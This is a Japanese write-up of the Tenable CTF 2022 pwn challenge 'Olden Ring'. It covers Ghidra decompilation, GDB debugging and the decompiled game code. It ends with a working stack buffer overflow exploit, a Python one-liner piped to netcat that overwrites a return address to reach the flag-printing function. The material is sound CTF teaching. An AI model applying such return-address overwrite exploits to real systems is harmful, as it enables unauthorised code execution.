---
weight: 1
bookFlatSection: true
title: "Tenable CTF 2022 Writeup 'Olden Ring'[pwn]"
---

# Tenable CTF 2022 Writeup 'Olden Ring'[pwn]

この記事では，CTF (Capture the Flag) オンライン大会の[Tenable CTF 2022](https://tenable.ctfd.io/scoreboard)で取り組んだ問題の解説をおこないます．


Tenable CTFには，研究室のメンバー3名でチームを作って挑戦しました．
私が取り組んだ問題は，pwnの'Olden Ring'です．
ポイントは100ptsと一番低い分類にあたるので，pwn初心者問題だと思われます．



## 問題

netcatで接続するためのリモートサーバのIP,ポート番号の情報と，oldenというファイルが添付されている．


fileコマンドでファイルの内容を調べたところ，64bitのELFバイナリファイルであることはわかりました．


## 解説

ファイルを実行してみる（または，netcatでリモートサーバに接続してみる）と，どうやらコマンドラインのゲームらしいです．（問題名から察するに，ELDEN RING風のゲームなのかも？？）
いくつかの説明文とともに，コマンドラインで入力が求められるというものでした．


バイナリファイルをGhidraを使ってデコンパイルした結果，main関数の他にdefeat_frog_guys関数，boss_fight関数があることがわかります．

その他の関数として，どの関数からも呼び出されていない`zip_to_end`関数があり，flag.txtの内容を出力する処理を行なっています．
つまり，最終的にこの関数を実行することができれば，フラグを取得できるはず．


脆弱性を探す上で，ユーザからの入力を受け付けている関数の使い方に誤りがないかをチェックしていきました．
すると，fgets関数がバッファサイズを指定して使われていることがわかります．ユーザ入力の格納先は`local_418` (Ghidraのデコンパイル時に自動生成された変数名) という変数でした．

```c
fgets((char *)&local_418, 0x400, stdin);
```
変数local_418はローカル変数なので，BOFできればmain関数のreturnアドレス書き換えが可能です．
しかし，どうやらこの変数local_418のバッファサイズは0x400はあるようで，fgetsによってBOFできそうには見えませんでした．

main関数内で，変数local_418から0x400バイト分0で埋めることによって初期化しているため，バッファサイズが0x400バイトあることは想定されているようです．
```c
memset(&local_418, 0, 0x400);
```


変数local_418が利用されている箇所を中心に，他の処理をチェックしてみます．

defeat_frog_guysという関数の引数として変数local_418 (ユーザ文字列のバッファ) が利用されているため，

```c
// local_418が利用されている！
defeat_frog_guys(&local_418, local_14);
```

このdefeat_frog_guys関数では，memcpy等を用いて，データのコピーが行われているようでした．
コピーの流れが複雑なため，ソースコードから挙動を理解するのに時間がかかると判断したため，ここからはGDBによってプログラムを実行させながら挙動を把握していきました．

ユーザが入力した文字列は，defeat_frog_guys関数のスタックフレーム内にコピーされているようでした．
そこで，ためしに'AAAAA...'という長さ0x400の文字列を入力したところ，`Segmentation fault`が発生し，BOFが発生したことを確認できました！
defeat_frog_guys関数のスタックがBOF可能ということがわかったので，あとはdefeat_frog_guys→mainに戻る際のreturnアドレスを書き換えて，zip_to_end関数の先頭アドレスにすれば完了です．

1. zip_to_end関数のアドレス：0x4012b6（ASLR，PIE等のセキュリティ機構はオフになっているのでアドレスは固定でした）
2. returnアドレス書き換えのためのパディングの長さ：0x3f3バイト
3. ２回目のfgetsで入力する数値：199

２回目のfgetsで入力する数値によって，コピーされる場所が何バイトかずれたりするようで，上記の2と3については，
何度か入力する数値，パディングの長さを変えてGDBを実行しました．
GDBではプログラム実行中にブレークポイントを設置して，プログラムのある時点でのスタックの内容を表示することができるため，この機能を使うことでパディングの長さを調整しました．
使用したGDBのコマンドは主に以下のようなものです．

```bash
// ブレークポイントを設置する
(gdb) break 0x400000

// 現在のスタックtopから40x8バイト分のデータを表示する．
(gdb) x/40gx $rsp 
```



最終的に，以下のコマンドを実行することでexploitコードが出力されます．
これをリモートサーバのプログラムの入力として与えることでフラグが手に入ります．

```
python3 -c "print('A'  * 0x3f3 + '\xb6\x12\x40\x00\x00\x00\x00\x00' + '199')" | nc xxx.xxx.xxx.xxx 8000
```

## 所感
久しぶりに参加したため，脆弱性の探し方，GDB等のツールの使い方を思い出すという作業から始まりました．
定期的に手を動かして問題を解かないとすぐ忘れていくものだなと痛感しました．
これからチームメンバーも増やして定期的にCTF大会に参加したいと思っています．


## 配布されたバイナリのデコンパイル結果

Ghidraを使って，C言語のソースコードにデコンパイルした結果です．
主要な関数のみを記載しています．

```c
undefined8 main(void)
{
    long lVar1;
    undefined8 *puVar2;
    char local_420[8];
    undefined8 local_418;
    undefined8 local_410;
    undefined8 local_408[126];
    uint local_14;
    ulong local_10;

    local_10 = 0;
    local_418 = 0;
    local_410 = 0;
    puVar2 = local_408;
    for (lVar1 = 0x7e; lVar1 != 0; lVar1 = lVar1 + -1)
    {
        *puVar2 = 0;
        puVar2 = puVar2 + 1;
    }
    memset(&local_418, 0, 0x400);
    printf("\x1b[0;33m");
    printf(&DAT_00402488);
    printf("\x1b[0m");
    putchar(10);
    puts(
        "\n\nYou are on your way to becoming the Olden Lord, but first you must collect rings by defea ting many (many many) frog-guys!");
    printf("The rings will let you become powerful enough to face the final boss!");
    printf("\n\nFirst things first: What\'s your name?\n> ");
    fgets((char *)&local_418, 0x400, stdin);
    puts(&DAT_00402ca0);
    puts("--------------------\nFig a. A Frog-guy\n--------------------");
    while (local_10 < 5000)
    {
        printf("\n\n=============================================================================");
        puts(
            "\n\nFrom atop a hill, overlooking a lake of red, you see a field of 250 frog-guys just kind a hanging out, not bothering anyone.");
        printf("How many do you defeat to gather their rings?\n\n> ");
        fgets(local_420, 8, stdin);
        local_14 = atoi(local_420);
        if ((int)local_14 < 0)
        {
            printf("\nYou...create? frog-guys? Don\'t do that");
        }
        else if (local_14 == 0)
        {
            puts("\nYou spare all the frog-guys. Admirable.");
        }
        else if ((int)local_14 < 0xfb)
        {
            printf("\nYou set about your noble work of defeating %d nearly-defenseless, chillin\' frog-guy s\n\n", (ulong)local_14);
            defeat_frog_guys(&local_418, local_14);
            puts("\n\nYou rest to allow some frog-guys to reconvene.");
            local_10 = local_10 + (long)(int)local_14;
        }
        else if (0xfa < (int)local_14)
        {
            puts("\nWhoa now, we know you\'re excited, but there aren\'t that many in this field.");
        }
    }
    boss_fight();
    return 0;
}

void defeat_frog_guys(void *param_1, int param_2)

{
    void *__src;
    int iVar1;
    size_t sVar2;
    long lVar3;
    undefined **ppuVar4;
    undefined8 *puVar5;
    void **ppvVar6;
    byte bVar7;
    void *local_b48[100];
    undefined8 local_828;
    undefined8 local_820;
    undefined8 local_818[255];
    int local_1c;

    bVar7 = 0;
    local_828 = 0;
    local_820 = 0;
    puVar5 = local_818;
    for (lVar3 = 0xfe; lVar3 != 0; lVar3 = lVar3 + -1)
    {
        *puVar5 = 0;
        puVar5 = puVar5 + 1;
    }
    memset(&local_828, 0, 0x400);
    ppuVar4 = &PTR_DAT_0040d0a0;
    ppvVar6 = local_b48;
    for (lVar3 = 100; lVar3 != 0; lVar3 = lVar3 + -1)
    {
        *ppvVar6 = *ppuVar4;
        ppuVar4 = ppuVar4 + (ulong)bVar7 * -2 + 1;
        ppvVar6 = ppvVar6 + (ulong)bVar7 * -2 + 1;
    }
    sVar2 = strlen((char *)&local_828);
    memcpy((void *)((long)&local_828 + sVar2), "You defeat the following frog-guys:", 0x24);
    for (local_1c = 0; local_1c < param_2; local_1c = local_1c + 1)
    {
        iVar1 = rand();
        __src = local_b48[iVar1 % 99];
        sVar2 = strlen((char *)&local_828);
        memcpy((void *)((long)&local_828 + sVar2), __src, 5);
        sVar2 = strlen((char *)&local_828);
        memcpy((void *)((long)&local_828 + sVar2), &DAT_00402444, 2);
    }
    sVar2 = strlen((char *)&local_828);
    memcpy((void *)((long)&local_828 + sVar2), "\n\nFrog-guys across the land will fear the name ", 0x32);
    sVar2 = strlen((char *)&local_828);
    memcpy((void *)((long)&local_828 + sVar2), param_1, 0x400);
    printf("%s", &local_828);
    return;
}

void boss_fight(void)

{
    puts("\nDang, you must be like...really really powerful. Ok, you uh...how\'d you get here?");
    puts(
        "You try to fight the boss, but your build has been nerfed in a patch, and you get one-shotted  almost instantly.");
    printf("You die. Enjoy fighting your way here again.");
    /* WARNING: Subroutine does not return */
    exit(0);
}

// zip_to_end関数の先頭アドレス：0x00000000004012b6
void zip_to_end(void)

{
    int iVar1;
    char local_128[272];
    FILE *local_18;
    char local_9;

    puts("\nYou do some weird thing by blocking and timing frames!!!\n");
    puts(
        "\nYou arrive at the secret final boss!\nQuick! Choose your tactic to defeat it before being o ne-shotted!\n");
    puts("\n1) FROSTY STOMP!!!\n2) FROSTY STOMP!!!\n3) FROSTY STOMP!!!\n>\n");
    fgets(local_128, 0x102, stdin);
    puts("\nGood Strategy!!! You win! You\'re now the Olden Lord!\n");
    local_18 = fopen("/home/ctf/flag.txt", "r");
    if (local_18 != (FILE *)0x0)
    {
        while (local_9 != -1)
        {
            putchar((int)local_9);
            iVar1 = fgetc(local_18);
            local_9 = (char)iVar1;
        }
        fclose(local_18);
    }
    /* WARNING: Subroutine does not return */
    exit(0);
}
```